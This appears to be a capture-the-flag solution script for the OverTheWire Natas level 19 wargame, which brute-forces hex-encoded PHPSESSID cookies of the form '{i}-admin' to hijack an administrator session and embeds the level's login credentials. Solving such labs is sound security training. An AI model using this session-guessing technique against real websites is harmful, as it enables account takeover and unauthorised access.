#!/usr/bin/env python

import requests
import sys
import codecs

url = "http://natas19.natas.labs.overthewire.org/index.php"
maxid = 640

with requests.Session() as s:
    s.auth = (u'natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

    print(f"Connecting to {url} ...")
    res = s.get(url)

    '''
        * Here is how we are going to attack this level
        * cookie name: "PHPSESSID"
        c = codecs.(f"{i}-admin".encode(), "hex").decode()
        res = s.get(url, cookie={PHPSESSID: c})
    '''

    for i in range(1, maxid + 1):
        trial = codecs.encode(f"{i}-admin".encode(), "hex").decode()
        cookie = dict(PHPSESSID=trial)
        res = s.get(url, cookies=cookie)
        if "regular user" not in res.text:
            print(f"session id: {i}")
            break
        print(f"Trying {i} ...")
